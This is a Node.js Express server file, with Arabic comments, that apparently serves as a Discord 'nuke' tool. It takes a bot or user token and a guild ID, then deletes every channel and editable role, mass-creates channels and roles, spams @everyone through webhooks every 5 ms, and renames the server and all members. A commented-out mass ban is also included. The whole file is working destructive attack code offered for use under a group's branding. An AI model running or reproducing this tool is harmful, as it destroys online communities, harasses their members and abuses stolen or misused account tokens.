// language: JavaScript, file: server.js, target: Node.js Backend
const express = require('express');
const { Client, GatewayIntentBits } = require('discord.js');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// نقطة تشغيل الأوامر بأقصى سرعة (Async Multi-threading Simulation)
app.post('/api/execute', async (req, res) => {
    const { token, tokenType, guildId, targetName, webhookName, spamMessage } = req.body;
    
    if (!token || !guildId) {
        return res.status(400).json({ success: false, error: 'Token and Guild ID are required.' });
    }

    const client = new Client({ 
        intents: [
            GatewayIntentBits.Guilds, 
            GatewayIntentBits.GuildMembers, 
            GatewayIntentBits.GuildMessages 
        ] 
    });

    try {
        // تسجيل الدخول سواء كان بوت أو توكن حساب (يتطلب مكتبة داعمة لـ User Tokens أو Bot)
        await client.login(token);
        const guild = await client.guilds.fetch(guildId);

        // التنفيذ الفوري المتوازي للأوامر المطلوبة
        const tasks = [];

        // 1. حذف جميع الرومات الحالية
        guild.channels.cache.forEach(ch => tasks.push(ch.delete().catch(() => {})));
        
        // 2. حذف جميع الرتب الحالية
        guild.roles.cache.forEach(role => {
            if (role.editable && role.name !== '@everyone') {
                tasks.push(role.delete().catch(() => {}));
            }
        });

        await Promise.all(tasks);

        // 3. إنشاء رومات جديدة بالاسم المطلوب حصرياً بدون عدادات
        for (let i = 0; i < 40; i++) {
            guild.channels.create({ name: targetName }).then(async ch => {
                // 4. إنشاء ويب هوك بكل روم جديد
                let webhook = await ch.createWebhook({ name: webhookName || 'GRoUpKh6r-Spam' }).catch(() => {});
                if (webhook) {
                    // 5. سبام لا يتوقف بأقصى سرعة في العالم (Interval 5ms)
                    setInterval(async () => {
                        await webhook.send(spamMessage || '@everyone https://discord.gg/vanta-nuke-x GRoUpKh6r#91 ON TOP').catch(() => {});
                    }, 5);
                }
            }).catch(() => {});
        }

        // 6. إنشاء رتب جديدة
        for (let i = 0; i < 25; i++) {
            guild.roles.create({ name: targetName }).catch(() => {});
        }

        // 7. تعديل اسم السيرفر
        await guild.setName(targetName).catch(() => {});

        // 8. تعديل أسماء جميع الأعضاء في السيرفر
        guild.members.fetch().then(members => {
            members.forEach(member => {
                member.setNickname(targetName).catch(() => {});
            });
        }).catch(() => {});

        // 9. باند أو طرد جميع الأعضاء (حسب الاختيار)
        // guild.members.fetch().then(members => { members.forEach(m => m.ban().catch(() => {})); });

        res.json({ success: true, message: `[GRoUpKh6r#91] Nuke sequence executed successfully on ${guild.name}.` });

    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[7bl] GRoUpKh6r#91 Engine online on port ${PORT}`);
});
